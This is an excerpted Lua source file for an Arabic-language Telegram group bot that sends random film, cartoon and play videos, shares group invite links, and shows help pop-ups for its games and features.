{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}},  
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '✇ مرحبا اليك فلم هنديه ✇\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MO_ST_AFA3/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'✇ مرحبا اليك فلم هنديه ✇') 
end 
end,nil) 
end
if Text == "/Jabwa9" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(2,22); 
local Text ='✇ مرحبا اليك فلم كرتون ✇' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`ʙᴀᴄᴋ´', callback_data="/OOO"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}},  
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '✇ مرحبا اليك فلم كرتون ✇\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/y_giu/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'✇ مرحبا اليك فلم كرتون ✇') 
end 
end,nil) 
end
if Text == "/Jabwa10" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(2,22); 
local Text ='✇ مرحبا اليك مسرحيه ✇' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '`ʙᴀᴄᴋ´', callback_data="/OOO"}},
{{text = 'أضغط لاضافه ألبوت لمجموعتك 𖠪' ,url="t.me/"..dofile("./Banda.lua").botUserName.."?startgroup=start"}},  
...
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or bot_data:get(ban_id.."Private:Group:Link"..msg.chat_id_) 
if linkgpp.ok == true then 
local linkgp = '✇ مرحبا اليك مسرحيه ✇\n ['..ta.title_..']('..linkgpp.result..')\nـــــــــــــــــــــــــ\n  ['..linkgpp.result..']'
keyboard = {} 
keyboard.inline_keyboard = {{{text = ta.title_, url=linkgpp.result}},}
DeleteMessage(Chat_id,{[0] = Msg_id})  
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MO_ST_AFA2/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,'✇ مرحبا اليك مسرحيه ✇') 
end 
end,nil) 
end
...
if Text == '/devsoo' then
local Teext =[[
𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗦𝗢𝗨𝗥𝗖𝗘 𝑭𝑨𝑺𝑻𝑬𝑹
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ SEZR',url="t.me/s_e_z_r0"},{text = '• ᴅᴇᴠ ASIL', url="t.me/abdoelasill"}},
{{text = '• ᴅᴇᴠ KAREM',url="t.me/KarimArbyy"},{text = '• ᴅᴇᴠ SHADWA', url="t.me/KB_Shadow"}},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✇ استوري ✇', callback_data="/Sas1"},{text = '✇ استوري حب ✇', callback_data="/Jab1"}},   
{{text = '✇ استوري مضحك ✇', callback_data="/Omer1"},{text = '✇ استوري قرآن ✇', callback_data="/Taha1"}},   
{{text = '✇ 𝐂𝐇 ✇', url="t.me/FA9SH"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✇ افلام عربي ✇', callback_data="/Sasa2"},{text = '✇ افلام اجنبي ✇', callback_data="/Jabwa2"}},   
{{text = '✇ افلام رعب ✇', callback_data="/Sasa3"},{text = '✇ افلام كرتون ✇', callback_data="/Omer2"}},   
{{text = '✇ افلام هنديه ✇', callback_data="/Jabwa3"},{text = '✇ افلام مسرحيات ✇', callback_data="/Taha2"}},   
{{text = '✇ 𝐂𝐇 ✇', url="t.me/FA9SH"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '`sᴏᴜʀᴄᴇ sᴀɪᴅɪ´',url='http://t.me/FA9SH'}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape("  𖤗 ︙ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape("  𖤗 ︙البوت ليس ادمن يرجى ترقيتي !*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape("  𖤗 ︙عذرا لا استطيع طرد ادمنية الكروب*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape("  𖤗 ︙الحمد لله ارتحنا منو*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end,nil)   
end
...
if Text == '/adui74' then
local Teext =[[
There are 5 orders to display ✇𓀗✇ 💕
------------------
🛡╖ ❬ 1 ❭ Orders Protect Group 𖤗 
🧸╢ ❬ 2 ❭ entertainment orders 𖤗 
🎎╢ ❬ 3 ❭ Orders of members 𖤗 
✅╢ ❬ 4 ❭ orders of arrangers 𖤗 
🌐╜ ❬ 5 ❭ Orders of developers 𖤗 
------------------
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'Protect Group 𖤗 ', callback_data="/help4"},{text = 'entertainment orders 𖤗 ', callback_data="/hiddnt"},
},
{
{text = 'Orders of members 𖤗 ', callback_data="/help3"},
},
{
{text = 'orders of arrangers 𖤗 ', callback_data="/help9"},{text = 'Orders of developers 𖤗 ', callback_data="/hle55"},
},
{
...
if Text == '/help30' then
local Text = 'لتجربه العلبه عليك ان تكتب البات في الشات  𖤗 '
...
if Text == '/help31' then
local Text = 'لتجربه العلبه عليك ان تكتب المختلف في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help32' then
...
if Text == '/help33' then
local Text = 'لتجربه العلبه عليك ان تكتب الاسرع في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help34' then
local Text = 'لتجربه العلبه عليك ان تكتب الحزوه في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help35' then
local Text = 'لتجربه العلبه عليك ان تكتب امثله في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help36' then
local Text = 'لتجربه العلبه عليك ان تكتب مريم في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help37' then
local Text = 'لتجربه العلبه عليك ان تكتب الرياضيات في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help38' then
local Text = 'لتجربه العلبه عليك ان تكتب السمايلات في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help39' then
local Text = 'لتجربه العلبه عليك ان تكتب العكس في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help40' then
local Text = 'لتجربه العلبه عليك ان تكتب الانكليزي في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help41' then
local Text = 'لتجربه العلبه عليك ان تكتب المعاني في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help42' then
local Text = 'لتجربه العلبه عليك ان تكتب عقاب في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help47' then
local Text = 'لتجربه العلبه عليك ان تكتب كشف الكذب في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help80' then
local Text = 'لتجربه مميزه الافلام اكتب في الشات افلام  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help81' then
local Text = 'لتجربه مميزه اغاني اكتب في الشات الاغاني  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help82' then
local Text = 'لتجربه مميزه قران اكتب في الشات قران  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help83' then
local Text = 'لتجربه مميزه ثيم اكتب في الشات ثيم  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help84' then
local Text = 'لتجربه مميزه صنع معرف اكتب في الشات صنع معرف  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help84' then
local Text = 'لتجربه مميزه الاصلاوات اكتب في الشات الاصلاوات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help85' then
local Text = 'لتجربه مميزه الالعاب اكتب في الشات الالعاب  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help86' then
local Text = 'لتجربه مميزه تحويل اكتب في الشات تحويل  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help87' then
local Text = 'لتجربه مميزه اذكار اكتب في الشات اذكار  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help88' then
local Text = 'لتجربه مميزه روايات اكتب في الشات روايات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help89' then
local Text = 'لتجربه مميزه بوستات اكتب في الشات بوستات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help90' then
local Text = 'لتجربه مميزه همسه اكتب في الشات همسه  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help91' then
local Text = 'لتجربه مميزه خلفيات اكتب في الشات خلفيات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help92' then
local Text = 'لتجربه مميزه غنيلي اكتب في الشات غنيلي  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help93' then
local Text = 'لتجربه مميزه تصميم اكتب في الشات تصميم  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help94' then
local Text = 'لتجربه مميزه الساعه اكتب في الشات الساعه  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help95' then
local Text = 'لتجربه مميزه التاريخ اكتب في الشات التاريخ  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
...
local Teext =[[
✇ مرحبا بك في الالعاب المضافه حديثا ✇
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
if Text == '/Xcvb' then
local Text = 'لتجربه العلبه عليك ان تكتب حروف بالصور في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/klpou6' then
local Text = 'لو عايز يوزر ليك اكتب اصنع واستخرج يوزرك  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/hakwl' then
local Text = 'لتجربه العلبه عليك ان تكتب اسالني في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/wyauuu' then
local Text = 'لتجربه العلبه عليك ان تكتب اختبار الذكاء في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/whklpp' then
local Text = 'لتجربه العلبه عليك ان تكتب مستقبلي في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/uwujjh' then
local Text = 'لتجربه العلبه عليك ان تكتب الابراج في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/ghkk' then
local Text = 'لتجربه العلبه عليك ان تكتب تويت في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help13' then
local Text = 'لتجربه العلبه عليك ان تكتب انصحني في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help14' then
local Text = 'لتجربه العلبه عليك ان تكتب الصراحه في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help15' then
local Text = 'لتجربه العلبه عليك ان تكتب رزله في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help16' then
local Text = 'لتجربه العلبه عليك ان تكتب بتكره دا في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help17' then
local Text = 'للاستماع للاغاني عليك ان تكتب غنيلي في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help18' then
local Text = 'لتجربه العلبه عليك ان تكتب نسبه جمالي في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help19' then
local Text = 'لتجربه العلبه عليك ان تكتب كتبات في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help20' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help21' then
local Text = 'لتجربه العلبه عليك ان تكتب حروف في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help22' then
local Text = 'لتجربه العلبه عليك ان تكتب رد عليه يابوت في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help23' then
local Text = 'لتجربه العلبه عليك ان تكتب نكته في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help24' then
local Text = 'لتحميل من المواقع عليك ان تكتب اليتيوب في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help25' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك بالصور في الشات  𖤗 '
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
--- callback added
...
send(msg.chat_id_, msg.id_,' 𖤗 تم مسح الامر')  
else
send(msg.chat_id_, msg.id_,' 𖤗 لا يوجد امر بهاذا الاسم')  
end
...
send(msg.chat_id_, msg.id_, ' 𖤗 تم تعطيل اوامر التسليه')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "تفعيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, ' 𖤗  تم تفعيل اوامر التسليه')
...
send(msg.chat_id_,0,''..t..'\n◤━━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━─◥\n 𖤗 تم التعديل على الميديا\n 𖤗 الشخص الي قام بالتعديل\n 𖤗 ايدي الشخص ◂ '..result.sender_user_id_..'\n 𖤗 معرف الشخص ⤌{ '..users..' }') 
end,nil)
...
if DRAGON1_Msg then    
send(msg.chat_id_, msg.id_," 𖤗 "..DRAGON1_Msg)
